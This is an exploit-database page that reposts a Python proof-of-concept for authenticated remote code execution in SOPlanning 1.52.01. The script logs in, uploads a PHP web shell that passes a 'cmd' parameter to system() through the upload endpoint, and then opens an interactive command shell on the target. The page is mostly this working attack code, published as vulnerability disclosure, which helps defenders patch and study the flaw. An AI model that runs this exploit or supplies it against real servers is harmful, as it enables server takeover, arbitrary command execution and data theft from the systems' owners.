---
title: SOPlanning 1.52.01 (Simple Online Planning Tool) Remote Code Execution (RCE) (Authenticated)
url: https://cxsecurity.com/issue/WLB-2024110028
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-11-18
fetch_date: 2025-10-06T19:12:17.258294
---

# SOPlanning 1.52.01 (Simple Online Planning Tool) Remote Code Execution (RCE) (Authenticated)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SOPlanning 1.52.01 (Simple Online Planning Tool) Remote Code Execution (RCE) (Authenticated)** **2024.11.17**  Credit:  **[Ardayfio Samuel Nii Aryee](https://cxsecurity.com/author/Ardayfio%2BSamuel%2BNii%2BAryee/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: SOPlanning 1.52.01 (Simple Online Planning Tool) - Remote Code Execution (RCE) (Authenticated)
# Date: 6th October, 2024
# Exploit Author: Ardayfio Samuel Nii Aryee
# Version: 1.52.01
# Tested on: Ubuntu
import argparse
import requests
import random
import string
import urllib.parse
def command\_shell(exploit\_url):
commands = input("soplaning:~$ ")
encoded\_command = urllib.parse.quote\_plus(commands)
command\_res = requests.get(f"{exploit\_url}?cmd={encoded\_command}")
if command\_res.status\_code == 200:
print(f"{command\_res.text}")
return
print(f"Error: An erros occured while running command: {encoded\_command}")
def exploit(username, password, url):
target\_url = f"{url}/process/login.php"
upload\_url = f"{url}/process/upload.php"
link\_id = ''.join(random.choices(string.ascii\_lowercase + string.digits, k=6))
php\_filename = f"{''.join(random.choices(string.ascii\_lowercase + string.digits, k=3))}.php"
login\_data = {"login":username,"password":password}
res = requests.post(target\_url, data=login\_data, allow\_redirects=False)
cookies = res.cookies
multipart\_form\_data = {
"linkid": link\_id,
"periodeid": 0,
"fichiers": php\_filename,
"type": "upload"
}
web\_shell = "<?php system($\_GET['cmd']); ?>"
files = {
'fichier-0': (php\_filename, web\_shell, 'application/x-php')
}
upload\_res = requests.post(upload\_url, cookies=cookies,files=files, data=multipart\_form\_data)
if upload\_res.status\_code == 200 and "File" in upload\_res.text:
print(f"[+] Uploaded ===> {upload\_res.text}")
print("[+] Exploit completed.")
exploit\_url = f"{url}/upload/files/{link\_id}/{php\_filename}"
print(f"Access webshell here: {exploit\_url}?cmd=<command>")
if "yes" == input("Do you want an interactive shell? (yes/no) "):
try:
while True:
command\_shell(exploit\_url)
except Exception as e:
raise(f"Error: {e}")
else:
pass
def main():
parser = argparse.ArgumentParser(prog="SOplanning RCE", \
usage=f"python3 {\_\_file\_\_.split('/')[-1]} -t http://example.com:9090 -u admin -p admin")
parser.add\_argument("-t", "--target", type=str, help="Target URL (e.g., http://localhost:8080)", required=True)
parser.add\_argument("-u", "--username",type=str,help="username", required=True)
parser.add\_argument("-p", "--password",type=str,help="password", required=True)
args = parser.parse\_args()
exploit(args.username, args.password, args.target)
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024110028)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top